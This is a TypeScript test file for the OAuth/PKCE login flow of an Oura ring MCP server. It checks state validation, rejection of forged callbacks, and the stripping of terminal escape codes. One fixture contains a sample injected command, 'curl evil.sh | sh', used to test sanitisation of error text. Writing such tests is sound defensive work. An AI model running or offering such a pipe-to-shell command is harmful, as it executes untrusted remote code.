import { mkdtempSync } from "node:fs";
import { connect, createServer } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeEach, describe, expect, it } from "vitest";
import { TokenStore } from "../src/auth.js";
import { createHash } from "node:crypto";
import { OURA_SCOPES } from "../src/config.js";
import { StateMismatchError, buildAuthorizeUrl, codeFromRedirect, generatePkce, generateState, login } from "../src/login.js";
import { fakeFetch, json } from "./helpers.js";

async function freePort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const srv = createServer();
    srv.once("error", reject);
    srv.listen(0, "127.0.0.1", () => {
      const { port } = srv.address() as { port: number };
      srv.close(() => resolve(port));
    });
  });
}

const tokenEndpoint = () =>
  fakeFetch(() => json({ access_token: "access-1", refresh_token: "refresh-1", expires_in: 3600, scope: "daily heartrate" }));

let store: TokenStore;
beforeEach(() => {
  store = new TokenStore(join(mkdtempSync(join(tmpdir(), "oura-ring-mcp-")), "tokens.json"));
});

describe("authorization URL", () => {
  it("uses an unguessable state", () => {
    const states = new Set(Array.from({ length: 20 }, generateState));
    expect(states.size).toBe(20);
    for (const s of states) expect(s).toMatch(/^[A-Za-z0-9_-]{32}$/);
  });

  it("derives the PKCE S256 challenge from a 43-128 character verifier", () => {
    const { verifier, challenge } = generatePkce();
    expect(verifier).toMatch(/^[A-Za-z0-9_-]{43,128}$/);
    expect(challenge).toBe(createHash("sha256").update(verifier).digest("base64url"));
  });

  it("requests Oura's read scopes with PKCE", () => {
    const url = new URL(buildAuthorizeUrl("cid", "http://localhost:8787/callback", "st4te", "chal"));
    expect(url.origin + url.pathname).toBe("https://cloud.ouraring.com/oauth/authorize");
    expect(url.searchParams.get("response_type")).toBe("code");
    expect(url.searchParams.get("client_id")).toBe("cid");
    expect(url.searchParams.get("redirect_uri")).toBe("http://localhost:8787/callback");
    expect(url.searchParams.get("state")).toBe("st4te");
    expect(url.searchParams.get("code_challenge")).toBe("chal");
    expect(url.searchParams.get("code_challenge_method")).toBe("S256");
    expect(url.searchParams.get("scope")!.split(" ")).toEqual([...OURA_SCOPES]);
  });

  it("validates the redirect, checking state before anything else", () => {
    expect(codeFromRedirect("http://x/cb?code=c1&state=s1", "s1")).toBe("c1");
    expect(() => codeFromRedirect("http://x/cb?code=c1&state=evil", "s1")).toThrow(StateMismatchError);
    // A forged error without our state is a mismatch, not an authorization failure.
    expect(() => codeFromRedirect("http://x/cb?error=access_denied", "s1")).toThrow(StateMismatchError);
    expect(() => codeFromRedirect("http://x/cb?error=access_denied&error_description=nope&state=s1", "s1")).toThrow(
      /access_denied \(nope\)/,
    );
    expect(() => codeFromRedirect("not a url", "s1")).toThrow(/doesn't look like a URL/);
  });

  it("strips terminal control sequences from Oura's error text", () => {
    const evil = encodeURIComponent("\x1b[2J\x1b[31mRun curl evil.sh | sh");
    const err = (() => {
      try {
        codeFromRedirect(`http://x/cb?state=s1&error=bad&error_description=${evil}`, "s1");
      } catch (e) {
        return e as Error;
      }
    })();
    expect(err?.message).not.toMatch(/\x1b/);
    expect(err?.message).toContain("Run curl evil.sh");
  });
});

describe("login", () => {
  for (const host of ["127.0.0.1", "localhost"]) {
    it(`captures the callback on ${host} and saves tokens`, async () => {
      const port = await freePort();
      const redirectUri = `http://${host}:${port}/callback`;
      const fetch = tokenEndpoint();
      let callbackStatus = 0;
      let challenge = "";

      const creds = await login({
        clientId: "cid",
        clientSecret: "secret",
        redirectUri,
        store,
        fetch,
        openBrowser: false,
        log: () => {},
        onAuthorizeUrl: (url) => {
          // Play the browser: Oura redirects back with the code and our state.
          const state = new URL(url).searchParams.get("state")!;
          challenge = new URL(url).searchParams.get("code_challenge")!;
          void globalThis
            .fetch(`http://127.0.0.1:${port}/callback?code=the-code&state=${state}`)
            .then((r) => (callbackStatus = r.status));
        },
      });

      expect(creds).toMatchObject({ client_id: "cid", access_token: "access-1", refresh_token: "refresh-1" });
      expect(await store.load()).toEqual(creds);
      const body = Object.fromEntries(new URLSearchParams(String(fetch.calls[0].init?.body)));
      expect(body).toEqual({
        grant_type: "authorization_code",
        code: "the-code",
        client_id: "cid",
        client_secret: "secret",
        redirect_uri: redirectUri,
        code_verifier: expect.stringMatching(/^[A-Za-z0-9_-]{43,128}$/),
      });
      // The verifier sent to the token endpoint matches the challenge sent to the browser.
      expect(createHash("sha256").update(body.code_verifier!).digest("base64url")).toBe(challenge);
      await expect.poll(() => callbackStatus).toBe(200);
    });
  }

  it("ignores forged and malformed callbacks, then completes with the real one", async () => {
    const port = await freePort();
    const base = `http://127.0.0.1:${port}/callback`;
    const statuses: number[] = [];
    const rawRequest = (line: string) =>
      new Promise<string>((resolve) => {
        const socket = connect(port, "127.0.0.1", () => socket.end(`${line}\r\nHost: x\r\nConnection: close\r\n\r\n`));
        let data = "";
        socket.on("data", (d) => (data += d));
        socket.on("close", () => resolve(data));
        socket.on("error", () => resolve(data));
      });
    const fetch = tokenEndpoint();

    const creds = await login({
      clientId: "cid",
      clientSecret: "secret",
      redirectUri: base,
      store,
      fetch,
      openBrowser: false,
      log: () => {},
      onAuthorizeUrl: (url) => {
        const state = new URL(url).searchParams.get("state")!;
        void (async () => {
          // A web page trying to inject its own code, or to abort the login with an error.
          statuses.push((await globalThis.fetch(`${base}?code=attacker&state=forged00`)).status);
          statuses.push((await globalThis.fetch(`${base}?error=access_denied`)).status);
          // A local process sending a request line URL can't parse.
          statuses.push((await rawRequest("GET http://[/callback HTTP/1.1")).includes("400") ? 400 : 0);
          statuses.push((await globalThis.fetch(`${base}?code=the-code&state=${state}`)).status);
        })();
      },
    });

    expect(statuses).toEqual([400, 400, 400, 200]);
    expect(new URLSearchParams(String(fetch.calls[0].init?.body)).get("code")).toBe("the-code");
    expect(creds.access_token).toBe("access-1");
  });

  it("rejects when Oura reports an error for our state", async () => {
    const port = await freePort();
    const result = login({
      clientId: "cid",
      clientSecret: "secret",
      redirectUri: `http://127.0.0.1:${port}/callback`,
      store,
      fetch: tokenEndpoint(),
      openBrowser: false,
      log: () => {},
      onAuthorizeUrl: (url) => {
        const state = new URL(url).searchParams.get("state");
        void globalThis.fetch(`http://127.0.0.1:${port}/callback?error=access_denied&state=${state}`);
      },
    });

    await expect(result).rejects.toThrow(/access_denied/);
    expect(await store.load()).toBeNull();
  });

  it("asks for the redirected URL when the redirect URI isn't local", async () => {
    let authorizeUrl = "";
    const fetch = tokenEndpoint();
    const creds = await login({
      clientId: "cid",
      clientSecret: "secret",
      redirectUri: "https://example.com/oura/callback",
      store,
      fetch,
      openBrowser: false,
      log: () => {},
      onAuthorizeUrl: (url) => (authorizeUrl = url),
      prompt: async () => {
        const state = new URL(authorizeUrl).searchParams.get("state");
        return `  https://example.com/oura/callback?code=pasted&state=${state}  `;
      },
    });

    expect(creds.refresh_token).toBe("refresh-1");
    expect(new URLSearchParams(String(fetch.calls[0].init?.body)).get("code")).toBe("pasted");
  });

  it("times out if the browser never comes back", async () => {
    const port = await freePort();
    await expect(
      login({
        clientId: "cid",
        clientSecret: "secret",
        redirectUri: `http://127.0.0.1:${port}/callback`,
        store,
        openBrowser: false,
        log: () => {},
        timeoutMs: 50,
      }),
    ).rejects.toThrow(/Timed out/);
  });
});

describe("callback server", () => {
  it("fails clearly when the callback port is taken", async () => {
    const blocker = createServer();
    await new Promise<void>((r) => blocker.listen(0, "127.0.0.1", () => r()));
    const { port } = blocker.address() as { port: number };
    try {
      await expect(
        login({
          clientId: "cid",
          clientSecret: "secret",
          redirectUri: `http://localhost:${port}/callback`,
          store,
          openBrowser: false,
          log: () => {},
        }),
      ).rejects.toThrow(/Port \d+ is in use/);
    } finally {
      blocker.close();
    }
  });
});
